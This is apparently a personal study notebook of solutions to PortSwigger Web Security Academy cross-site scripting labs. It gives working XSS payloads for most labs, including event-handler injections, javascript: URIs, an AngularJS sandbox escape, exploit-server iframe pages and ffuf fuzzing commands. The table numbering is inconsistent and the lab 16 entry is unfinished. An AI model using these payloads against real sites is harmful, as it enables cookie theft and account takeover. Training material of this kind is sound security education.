---
created: 2026-05-11
---
	

| `#`   | Solved? | Name                                                                                                                       | Date    | Notes         |
| ----- | ------- | -------------------------------------------------------------------------------------------------------------------------- | ------- | ------------- |
| `1.`  | `✓`     | Reflected XSS into HTML context with nothing encoded                                                                       | `12.05` |               |
| `2.`  | `✓`     | Stored XSS into HTML context with nothing encoded                                                                          | `12.05` |               |
| `3.`  | `✓`     | DOM XSS in `document.write` sink using source `location.search`                                                            | `12.05` |               |
| `4.`  | `✓`     | DOM XSS in `innerHTML` sink using source `location.search`<br>                                                             | `13.05` |               |
| `5.`  | `✓`     | DOM XSS in jQuery anchor `href` attribute sink using `location.search` source                                              | `13.05` |               |
| `6.`  | `✓`     | DOM XSS in jQuery selector sink using a hashchange event                                                                   | `13.05` |               |
| `7.`  | `✓`     | Reflected XSS into attribute with angle brackets HTML-encoded                                                              | `13.05` |               |
| `8.`  | `✓`     | Stored XSS into anchor `href` attribute with double quotes HTML-encoded                                                    | `13.05` |               |
| `9.`  | `✓`     | Reflected XSS into a JavaScript string with angle brackets HTML-encoded                                                    | `13.05` |               |
| `10.` | `✓`     | DOM XSS in `document.write` sink using source `location.search` inside a select element<br>                                | `13.05` |               |
| `11.` | `✓`     | DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded                                         | `15.05` |               |
| `12.` | `✓`     | Reflected DOM XSS                                                                                                          | `15.05` |               |
| `13.` | `✓`     | Stored DOM XSS                                                                                                             | `15.05` |               |
| `14.` | `✓`     | Reflected XSS into HTML context with most tags and attributes blocked                                                      | `12.05` |               |
| `15.` | `✓`     | Reflected XSS into HTML context with all tags blocked except custom ones                                                   | `13.05` |               |
| `16.` | `✓`     | Reflected XSS in canonical link tag                                                                                        | `13.05` |               |
| `17.` | `✓`     | Reflected XSS into a JavaScript string with single quote and backslash escaped<br>                                         | `13.05` |               |
| `18.` |         | Stored DOM XSS                                                                                                             |         |               |
| `19.` | `✓`     | Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped        | `13.05` |               |
| `20.` | `✓`     | Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped | `13.05` |               |
| `21.` | `✓`     | Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped  | `13.05` |               |
| `22.` | `✓`     | Exploiting cross-site scripting to steal cookies                                                                           | `13.05` | #Collaborator |
| `23.` |         | Exploiting cross-site scripting to capture passwords                                                                       |         | #Collaborator |
| `24.` | `✓`     | Exploiting XSS to bypass CSRF defenses                                                                                     | `01.07` |               |
| `25.` |         | Reflected XSS protected by very strict CSP, with dangling markup attack                                                    |         |               |



## 1. Reflected XSS into HTML context with nothing encoded

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Reflected XSS into HTML context with nothing encoded`](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)
> - Level: #Apprentice 
> 
> This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.
> 
> To solve the lab, perform a cross-site scripting attack that calls the `alert` function.

### Solution

- The application has a search functionality. Enter a test string and observe where it is reflected in HTML:

![[images/walkthrough/PortSwigger/XSS/lab1/1.png]]

- Introduce a `<script>` tag and paste JavaScript inside:

```HTML
<script>alert(document.domain)</script>
```

![[images/walkthrough/PortSwigger/XSS/lab1/2.png]]


![[images/walkthrough/PortSwigger/XSS/lab1/solved.png]]

Solved!
## 2. Stored XSS into HTML context with nothing encoded

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Stored XSS into HTML context with nothing encoded`](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)
> - Level: #Apprentice 
> 
> This lab contains a stored cross-site scripting vulnerability in the comment functionality.
> 
> To solve this lab, submit a comment that calls the `alert` function when the blog post is viewed.

### Solution

- Blog posts have a comment section. Send a test comment and see how it's reflected on the page:

![[images/walkthrough/PortSwigger/XSS/lab2/1.png]]

- Attempt simple payloads:

![[images/walkthrough/PortSwigger/XSS/lab2/2.png]]

- The tag in the comment is treated as part of page HTML:

![[images/walkthrough/PortSwigger/XSS/lab2/3.png]]

- Attempt to introduce a `<script>` tag with a payload:

```HTML
<script>alert(document.domain)</script>
```

- Navigating back to the blog once the comment is submitted:

![[images/walkthrough/PortSwigger/XSS/lab2/4.png]]

![[images/walkthrough/PortSwigger/XSS/lab2/solved.png]]

Solved!
## 3. DOM XSS in `document.write` sink using source `location.search`

>[!done]

>[!note]+ Lab description
> 
> 
> - [`Lab: DOM XSS in document.write sink using source location.search`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)
> - Level: #Apprentice 
> 
> This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL.
> 
> To solve this lab, perform a cross-site scripting attack that calls the `alert` function.

### Solution

- Enter a test search payload and inspect HTML:

![[images/walkthrough/PortSwigger/XSS/lab3/1.png]]

- `<script>` tag looks like this:


```HTML
<script>
	function trackSearch(query) {
		document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
	}
	var query = (new URLSearchParams(window.location.search)).get('search');
	if(query) {
		trackSearch(query);
	}
</script>
```

- This is a tracker script that logs users' queries. 
- The query is taken from the `search` `GET` parameter and directly concatenated with a string in `document.write`, with no sanitization. 
- You can see the `<img>` element being created in the DOM after the `<script>` tag.

- Analyzing the context, construct the payload:

```HTML
test"><script>alert(document.domain)</script>
```

![[images/walkthrough/PortSwigger/XSS/lab3/2.png]]

![[images/walkthrough/PortSwigger/XSS/lab3/solved.png]]

Solved!
## 4. DOM XSS in `innerHTML` sink using source `location.search`

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: DOM XSS in innerHTML sink using source location.search`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)
> - Level: #Apprentice 
> 
> This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an `innerHTML` assignment, which changes the HTML contents of a `div` element, using data from `location.search`.
> 
> To solve this lab, perform a cross-site scripting attack that calls the `alert` function.


### Solution

- Inject a test string into the search field and inspect the source:

![[images/walkthrough/PortSwigger/XSS/lab4/1.png]]

- Notice that the search query is taken from the `search` `GET` parameter and inserted as `innerHTML` into the `searchMessage` element.

- Remember that `innerHTML` doesn't accept `<script>` tags, so injecting something like `<script>alert(document.domain)</script>` won't work. 
- But this should:

```HTML
<img src=x onerror=alert(document.domain)>
```

```html
/?search=%3cimg%20src%3dx%20onerror%3dalert(document.domain)%3e
```


![[images/walkthrough/PortSwigger/XSS/lab4/2.png]]

![[images/walkthrough/PortSwigger/XSS/lab4/solved.png]]
## 5. DOM XSS in jQuery anchor `href` attribute sink using `location.search` source

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: DOM XSS in jQuery anchor href attribute sink using location.search source`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)
> - Level: #Apprentice 
> 
> This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's `$` selector function to find an anchor element, and changes its `href` attribute using data from `location.search`.
> 
> To solve this lab, make the "back" link alert `document.cookie`.


### Solution

- On the `Submit feedback` page, notice JavaScript:

```js
$(function() {
	$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```

![[images/walkthrough/PortSwigger/XSS/lab5/1.png]]

- The `backlink` looks like this:

![[images/walkthrough/PortSwigger/XSS/lab5/2.png]]

- From the code, the `href` attribute of that `backlink` is set based on the `returnPath` parameter.
- Changing this parameter also changes the `backlink`'s `href`:

![[images/walkthrough/PortSwigger/XSS/lab5/3.png]]

- To trigger `alert(document.cookie)` on link click, use a `javascript:` URI:

```js
/feedback?returnPath=javascript:alert(document.cookie)
```

![[images/walkthrough/PortSwigger/XSS/lab5/solved.png]]

Solved!
## 6. DOM XSS in jQuery selector sink using a hashchange event

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: DOM XSS in jQuery selector sink using a hashchange event`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)
> - Level: #Apprentice 
> 
> This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property.
> 
> To solve the lab, deliver an exploit to the victim that calls the `print()` function in their browser.

### Solution

- In the home page source, find JavaScript:

```js
$(window).on('hashchange', function(){
var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
if (post) post.get(0).scrollIntoView();
});
```

- This code scrolls to the necessary blog post based on the URL hash (on change of its value).
- `window.location.hash.slice(1)` remotes the first character (`#`) so only the hash's value is used.
- The hash's value is inserted directly into the jQuery selector.
- To introduce JavaScript, use this payload:

```html
" onload="this.src+='<img src=1 onerror=print()>'">
```

![[images/walkthrough/PortSwigger/XSS/lab6/1.png]]

- Add the following to the exploit server:

```html
<iframe src="https://0a39009304540592802f172700cd0046.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'">
```


![[images/walkthrough/PortSwigger/XSS/lab6/2.png]]

- `Store` then `View exploit`:

![[images/walkthrough/PortSwigger/XSS/lab6/3.png]]

- Then `Deliver exploit to victim`.

![[images/walkthrough/PortSwigger/XSS/lab6/solved.png]]

Solved!
## 7. Reflected XSS into attribute with angle brackets HTML-encoded

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Reflected XSS into attribute with angle brackets HTML-encoded`](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded)
> - Level: #Apprentice 
> 
> This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the `alert` function.

### Solution

- Paste a canary string into the search field:

```
test123
```

- Then inspect the page source and find all places where this string is mentioned:

![[images/walkthrough/PortSwigger/XSS/lab7/1.png]]

- This is an attribute context. 

- Attempt to escape the attribute context:

```bash
test123" test
```

![[images/walkthrough/PortSwigger/XSS/lab7/2.png]]

- Angle brackets are, however, HTML-encoded, and you can't escape from the `<input>` tag with something like `test123">`.
- But you can do this:

```bash
test123" autofocus onfocus=alert(document.domain) x="
```

![[3.png]]

- In the source, the injection looks like this:

```HTML
<section class=search>
                        <form action=/ method=GET>
                            <input type=text placeholder='Search the blog...' name=search value="test123" autofocus onfocus=alert(document.domain) x="">
                            <button type=submit class=button>Search</button>
                        </form>
                    </section>
```

![[images/walkthrough/PortSwigger/XSS/lab7/solved.png]]

Solved!
## 8. Stored XSS into anchor `href` attribute with double quotes HTML-encoded

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded`](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded)
> - Level: #Apprentice 
> 
> This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.

### Solution

- This is a stored XSS in blog comment functionality:

![[images/walkthrough/PortSwigger/XSS/lab8/1.png]]

- The website field is inserted as a value for the `href` attribute. One of the ways to trigger JavaScript execution in URL attributes is using `javascript:` URLs:

```js
javascript:alert(document.domain)
```

- If the application doesn't encode or sanitize this, XSS should work. Use `Repeater` to submit such comment.

![[images/walkthrough/PortSwigger/XSS/lab8/2.png]]
![[images/walkthrough/PortSwigger/XSS/lab8/solved.png]]

Solved!

- If you click on the link in the comment section, you should see an alert firing:

![[images/walkthrough/PortSwigger/XSS/lab8/3.png]]

![[images/walkthrough/PortSwigger/XSS/lab8/4.png]]
## 9. Reflected XSS into a JavaScript string with angle brackets HTML encoded

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded`](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded)
> - Level: #Apprentice 
> 
> This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

### Solution

- The search term you enter is injected into page JavaScript:

![[images/walkthrough/PortSwigger/XSS/lab9/1.png]]

- Angle brackets are, however, HTML-encoded:

![[images/walkthrough/PortSwigger/XSS/lab9/2.png]]

- But you don't need to escape from the JavaScript context if you can escape the string context inside that JavaScript (single quotes not encoded):

```bash
test123'; alert(document.domain); x='a
```

![[images/walkthrough/PortSwigger/XSS/lab9/3.png]]

![[images/walkthrough/PortSwigger/XSS/lab9/solved.png]]

Solved!
## 10. DOM XSS in `document.write` sink using source `location.search` inside a select element

>[!done]

>[!note]+ Lab description
> - [`Lab: DOM XSS in document.write sink using source location.search inside a select element`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)
> - Level: #Practitioner 
> 
> This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search` which you can control using the website URL. The data is enclosed within a select element.
> 
> To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the `alert` function.

### Solution

- Check the `Check stock` functionality:

![[images/walkthrough/PortSwigger/XSS/lab10/1.png]]

- In the product page source, find JavaScript:

![[images/walkthrough/PortSwigger/XSS/lab10/2.png]]

```JS
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
	document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
	if(stores[i] === store) {
		continue;
	}
	document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```

- From the source code, you infer that the value of the HTTP `GET `parameter `storeId` (not present by default) is added as a store option.
- Try the following query string:

```JS
/product?productId=18&storeId=1
```

![[images/walkthrough/PortSwigger/XSS/lab10/3.png]]

- To achieve JavaScript code execution, introduce a `<script>` tag to the `storeId` parameter:

```bash
/product?productId=18&storeId=%20%3cscript%3ealert(1)%3c%2fscript%3e
```

![[images/walkthrough/PortSwigger/XSS/lab10/4.png]]

![[images/walkthrough/PortSwigger/XSS/lab10/5.png]]

![[images/walkthrough/PortSwigger/XSS/lab10/solved.png]]

Solved!
## 11. DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

>[!done]

>[!note]+ Lab description
> - [`Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)
> - Level: #Practitioner 
> 
> This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.
> 
> AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the `ng-app` attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.
> 
> To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the `alert` function.

### Solution

- Enter a test search query and inspect the source code.

![[images/walkthrough/PortSwigger/XSS/lab11/1.png]]

- Notice that the `<body>` element has the `ng-app` attribute, the AngularJS directive, and also imports AngularJS in the `<head>` section:

```html
<script type="text/javascript" src="[/resources/js/angular_1-7-7.js](https://0ab30055031434d580d05860006f003e.web-security-academy.net/resources/js/angular_1-7-7.js)"></script>
```

- Angle brackets, single quotes, and double quotes are HTML-encoded:

![[images/walkthrough/PortSwigger/XSS/lab11/2.png]]

- But in case of AngularJS, inside elements with the `ng-app` directive, you can use double square brackets to execute JavaScript. To check if expressions are evaluated, inject:

```js
{{ 5 + 5 }}
```

![[images/walkthrough/PortSwigger/XSS/lab11/3.png]]

- The application evaluates the result of the expression and reflects it in response. 
- However, simple `{{ alert() }}` won't work. 
- Newer versions are protected against arbitrary JavaScript execution. But older ones are vulnerable to sandbox escapes like this:

```js
{{ constructor.constructor('alert(1)')() }}
```

![[images/walkthrough/PortSwigger/XSS/lab11/4.png]]


![[images/walkthrough/PortSwigger/XSS/lab11/solved.png]]

Solved!
## 12. Reflected DOM XSS

>[!done]

>[!note]+ Lab description
> - [`Lab: Reflected DOM XSS`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)
> - Level: #Practitioner 
> 
> This lab demonstrates a reflected DOM vulnerability. Reflected DOM vulnerabilities occur when the server-side application processes data from a request and echoes the data in the response. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.
> 
> To solve this lab, create an injection that calls the `alert()` function.

### Solution

- Enter a test search query and inspect the page source:

![[images/walkthrough/PortSwigger/XSS/lab12/1.png]]

- In `searchResults.js`:

```js
function search(path) {
    var xhr = new XMLHttpRequest(); // AJAX request
    xhr.onreadystatechange = function() { 
        if (this.readyState == 4 && this.status == 200) { // runs every time the request is 200
            eval('var searchResultsObj = ' + this.responseText); // takes the server response and executes it as JavaScript code
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();

    function displaySearchResults(searchResultsObj) {
        var blogHeader = document.getElementsByClassName("blog-header")[0];
        var blogList = document.getElementsByClassName("blog-list")[0];
        var searchTerm = searchResultsObj.searchTerm
        var searchResults = searchResultsObj.results

        var h1 = document.createElement("h1");
        h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
        blogHeader.appendChild(h1);
        var hr = document.createElement("hr");
        blogHeader.appendChild(hr)

        for (var i = 0; i < searchResults.length; ++i)
        {
            var searchResult = searchResults[i];
            if (searchResult.id) {
                var blogLink = document.createElement("a");
                blogLink.setAttribute("href", "/post?postId=" + searchResult.id);

                if (searchResult.headerImage) {
                    var headerImage = document.createElement("img");
                    headerImage.setAttribute("src", "/image/" + searchResult.headerImage);
                    blogLink.appendChild(headerImage);
                }

                blogList.appendChild(blogLink);
            }

            blogList.innerHTML += "<br/>";

            if (searchResult.title) {
                var title = document.createElement("h2");
                title.innerText = searchResult.title;
                blogList.appendChild(title);
            }

            if (searchResult.summary) {
                var summary = document.createElement("p");
                summary.innerText = searchResult.summary;
                blogList.appendChild(summary);
            }

            if (searchResult.id) {
                var viewPostButton = document.createElement("a");
                viewPostButton.setAttribute("class", "button is-small");
                viewPostButton.setAttribute("href", "/post?postId=" + searchResult.id);
                viewPostButton.innerText = "View post";
            }
        }

        var linkback = document.createElement("div");
        linkback.setAttribute("class", "is-linkback");
        var backToBlog = document.createElement("a");
        backToBlog.setAttribute("href", "/");
        backToBlog.innerText = "Back to Blog";
        linkback.appendChild(backToBlog);
        blogList.appendChild(linkback);
    }
}

```

- So, the application uses a dangerous `eval()` sink; it evaluates server responses. If you can control them, you can execute JavaScript.
- Inspecting page's network traffic, you see that AJAX request:

![[images/walkthrough/PortSwigger/XSS/lab12/2.png]]

- The application returns the search term in response. The `search()` function in JS executes it directly.
- This is JSON, so you need to escape it:

```js
term"}; alert(document.domain)
```

- The double quote is backslash-escaped:

![[images/walkthrough/PortSwigger/XSS/lab12/3.png]]


- So try to escape it yourself:

```js
term\"}; alert(document.domain)
```

![[images/walkthrough/PortSwigger/XSS/lab12/4.png]]

- Finalize the payload:

```js
term\"}; alert(document.domain)//
```

![[images/walkthrough/PortSwigger/XSS/lab12/5.png]]

![[images/walkthrough/PortSwigger/XSS/lab12/solved.png]]

Solved!
- [ ] ## 13. Stored DOM XSS

>[!done]

>[!note]+ Lab description
> - [`Lab: Stored DOM XSS`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored)
> - Level: #Practitioner 
> 
> This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the `alert()` function.


### Solution

- Leave a test comment and inspect the page source:

![[images/walkthrough/PortSwigger/XSS/lab13/1.png]]

- Inspect that `loadCommentsWithVulnerableEscapeHtml.js`:

```js
function loadComments(postCommentPath) {
    let xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            let comments = JSON.parse(this.responseText);
            displayComments(comments);
        }
    };
    xhr.open("GET", postCommentPath + window.location.search);
    xhr.send();

    function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }

    function displayComments(comments) {
        let userComments = document.getElementById("user-comments");

        for (let i = 0; i < comments.length; ++i)
        {
            comment = comments[i];
            let commentSection = document.createElement("section");
            commentSection.setAttribute("class", "comment");

            let firstPElement = document.createElement("p");

            let avatarImgElement = document.createElement("img");
            avatarImgElement.setAttribute("class", "avatar");
            avatarImgElement.setAttribute("src", comment.avatar ? escapeHTML(comment.avatar) : "/resources/images/avatarDefault.svg");

            if (comment.author) {
                if (comment.website) {
                    let websiteElement = document.createElement("a");
                    websiteElement.setAttribute("id", "author");
                    websiteElement.setAttribute("href", comment.website);
                    firstPElement.appendChild(websiteElement)
                }

                let newInnerHtml = firstPElement.innerHTML + escapeHTML(comment.author)
                firstPElement.innerHTML = newInnerHtml
            }

            if (comment.date) {
                let dateObj = new Date(comment.date)
                let month = '' + (dateObj.getMonth() + 1);
                let day = '' + dateObj.getDate();
                let year = dateObj.getFullYear();

                if (month.length < 2)
                    month = '0' + month;
                if (day.length < 2)
                    day = '0' + day;

                dateStr = [day, month, year].join('-');

                let newInnerHtml = firstPElement.innerHTML + " | " + dateStr
                firstPElement.innerHTML = newInnerHtml
            }

            firstPElement.appendChild(avatarImgElement);

            commentSection.appendChild(firstPElement);

            if (comment.body) {
                let commentBodyPElement = document.createElement("p");
                commentBodyPElement.innerHTML = escapeHTML(comment.body);

                commentSection.appendChild(commentBodyPElement);
            }
            commentSection.appendChild(document.createElement("p"));

            userComments.appendChild(commentSection);
        }
    }
};

```

- The problem with this protection is that it only escapes the **first `<`** and the **first `>`**.
- So `escapeHTML("<img src=x onerror=alert(1)>")` returns `&lt;img src=x onerror=alert(1)>` — the final `>` is still there.

- The payload:


```html
<><img src=x onerror=alert(document.domain)>
```

![[images/walkthrough/PortSwigger/XSS/lab13/2.png]]

![[images/walkthrough/PortSwigger/XSS/lab13/3.png]]

![[images/walkthrough/PortSwigger/XSS/lab13/4.png]]

Solved!

## 14. Reflected XSS into HTML context with most tags and attributes blocked

>[!done]

>[!note]+ Lab description
> 
> - [`Lab: Reflected XSS into HTML context with most tags and attributes blocked`](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)
> - Level: #Practitioner 
> 
> This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.
> 
> To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the `print()` function.
> 
>>[!note]
>>Your solution must not require any user interaction. Manually causing `print()` to be called in your own browser will not solve the lab.

### Solution

- Enter a test string and observe your input is reflected on the page between HTML tags:

![[images/walkthrough/PortSwigger/XSS/lab14/1.png]]

- But if you enter a payload with a tag, such as `<script>alert(document.domain)</script>`, the application responds with an error:

![[images/walkthrough/PortSwigger/XSS/lab14/2.png]]

- Create a wordlist of tags from [`PortSwigger's XSS cheat sheet`](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).
- Copy the request link and stuff it to `ffuf`:

```bash
ffuf -u 'https://0a83006f04c9059d8096f306002f00c0.web-security-academy.net/?search=%3CFUZZ%3E' -w tags.txt -ic -c 
```

![[images/walkthrough/PortSwigger/XSS/lab14/3.png]]

- Fuzzing reveals the application allows two tags: `body` and custom `xss`.
- Try this payload:

```html
<body onerror=print() onload=/>
```

- See:

![[images/walkthrough/PortSwigger/XSS/lab14/4.png]]

- You need to do a very similar thing again, but with event handlers:

```bash
ffuf -u 'https://0a83006f04c9059d8096f306002f00c0.web-security-academy.net/?search=%3Cbody+FUZZ%3Dprint%281%29%2F%3E' -w events.txt -c -ic
```

- Many event handlers are allowed:

![[images/walkthrough/PortSwigger/XSS/lab14/5.png]]

- This payload works:

```bash
<body onresize="print()">
```

![[images/walkthrough/PortSwigger/XSS/lab14/6.png]]

- But it doesn't solve the lab because it requires the user to resize their window, which is an interaction from their side.

- But there is a workaround to resize the user's window automatically. In your exploit server, paste this:

```bash
<iframe src="https://0a83006f04c9059d8096f306002f00c0.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

![[images/walkthrough/PortSwigger/XSS/lab14/7.png]]

- If you view exploit, you'll see a print popup:

![[images/walkthrough/PortSwigger/XSS/lab14/8.png]]

- Click `Deliver exploit to victim`:

![[images/walkthrough/PortSwigger/XSS/lab14/solved.png]]

Solved!

## 15. Reflected XSS into HTML context with all tags blocked except custom ones

>[!done]

>[!note]+ Lab description
> - [`Lab: Reflected XSS into HTML context with all tags blocked except custom ones`](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)
> - Level: #Practitioner 
> 
> This lab blocks all HTML tags except custom ones.
> 
> To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts `document.cookie`.


### Solution

- The lab blocks all tags except custom ones like `<xss>`:

```HTML
<xss>
```

![[images/walkthrough/PortSwigger/XSS/lab15/1.png]]

- In the XSS cheat sheet, find this payload:

```html
<xss onfocus=alert(document.cookie) autofocus tabindex=1>
```

![[images/walkthrough/PortSwigger/XSS/lab15/2.png]]

- This payload works, but the lab requires that the alert pops up automatically.
- Custom tags can't normally be "focused", but `tabindex` makes an element focusable:  `<xss tabindex=1>`. Without it, focus often fails. Then on focus (`onfocus`), you fire `alert()`.

```HTML
<xss onfocus=alert(document.cookie) autofocus tabindex=1>
```

- Use this to construct the payload:

```HTML
<script>
	location = https://exploit-0a030090047d86e980d9207d010b0038.exploit-server.net/?search=%3Cxss+onfocus%3Dalert%28document.cookie%29+autofocus+tabindex=1%3E
</script>
```

- Decoded, the URL looks like this: ` https://exploit-0a030090047d86e980d9207d010b0038.exploit-server.net/?search=<xss onfocus=alert(document.cookie) autofocus tabindex=1>`. 
- To cause focus on the page, you can use a hash. Browsers automatically focus/jump to elements referenced in the URL hash.

- For example, with `<div id="test"></div>`, visiting `/page#test` moves focus/navigation to that element. 
- So if your injected element is 

```HTML
<xss id=x onfocus=alert(document.cookie) tabindex=1>
```

- Then as the victim visits `/page?search=PAYLOAD#x`
- That triggers:

```js
onfocus=alert(document.cookie)
```

![[images/walkthrough/PortSwigger/XSS/lab15/3.png]]


- The final payload becomes:


```html
<script>
	location = 'https://0a3200310450860c80e4214000930015.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29+tabindex=1%3E#x';
</script>
```

- Decoded:


```html
<script>
	location = 'https://exploit-0a030090047d86e980d9207d010b0038.exploit-server.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';
<script>
```

![[images/walkthrough/PortSwigger/XSS/lab15/4.png]]

- `View exploit`:

![[images/walkthrough/PortSwigger/XSS/lab15/5.png]]

- `Deliver exploit to victim`:

![[images/walkthrough/PortSwigger/XSS/lab15/4.png]]

![[images/walkthrough/PortSwigger/XSS/lab15/solved.png]]

Solved!
 
## 16. Reflected XSS with some SVG markup allowed

>[!note]+ Lab description
> - [`Lab: Reflected XSS with some SVG markup allowed`](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)
> - Level: #Practitioner 
> 
> 
> This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.
> 
> To solve the lab, perform a cross-site scripting attack that calls the `alert()` function.

### Solution

- The application allows `<svg>` tags:

![[images/walkthrough/PortSwigger/XSS/lab16/1.png]]

- However, now all attributes are allowed. If you try a payload similar to the one used in the previous one, you'll get an error:

```HTML
<svg id=x onfocus=alert(1)>
```

![[images/walkthrough/PortSwigger/XSS/lab16/2.png]]

- Send this to `Intruder` and enumerate through events:

```
/?search=%3Csvg+onfocus%3D1%3E
```

![[images/walkthrough/PortSwigger/XSS/lab16/3.png]]

- Or use `ffuf`:

```bash
ffuf -u 'https://0abb0041040815ec815f43310067006f.h1-web-security-academy.net/?search=%3Csvg+FUZZ%3D1%3E' -w events.txt
```

## 17. Reflected XSS in canonical link tag

>[!done]

>[!note]+ Lab description
> - [`Lab: Reflected XSS in canonical link tag`](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag)
> - Level: #Practitioner 
> 
> 
> This lab reflects user input in a canonical link tag and escapes angle brackets.
> 
> To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the `alert` function.
> 
> To assist with your exploit, you can assume that the simulated user will press the following key combinations:
> 
> - `ALT+SHIFT+X`
> - `CTRL+ALT+X`
> - `Alt+X`
> 
> Please note that the intended solution to this lab is only possible in Chrome.

### Solution

- From [research](https://portswigger.net/research/xss-in-hidden-input-fields), to trigger JavaScript on key combination, you should use something like:

```html
<link rel="canonical" accesskey="X" onclick="alert(1)" />
```

- View source of the main page:

![[images/walkthrough/PortSwigger/XSS/lab17/1.png]]

- There is that `canonical` link:

```html
<link rel="canonical" href='https://0a0d009603ecafd480cd038300410062.web-security-academy.net/'/>
```

- If the value is taken directly from the URL and reflected in HTML, XSS is possible. 

- Inject a dummy query parameter and see it's reflected in the canonical link:

```
/?q=x
```

![[images/walkthrough/PortSwigger/XSS/lab17/2.png]]

- Attempt the following payload:

```HTML
/?q=x'accesskey='X'onclick='alert(1)
```

![[images/walkthrough/PortSwigger/XSS/lab17/3.png]]

![[images/walkthrough/PortSwigger/XSS/lab17/solved.png]]

Solved!
## 18. Reflected XSS into a JavaScript string with single quote and backslash escaped

>[!done]

>[!note]+ Lab description
> - [`Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped`](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)
> - Level: #Practitioner 
> 
> This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.
> 
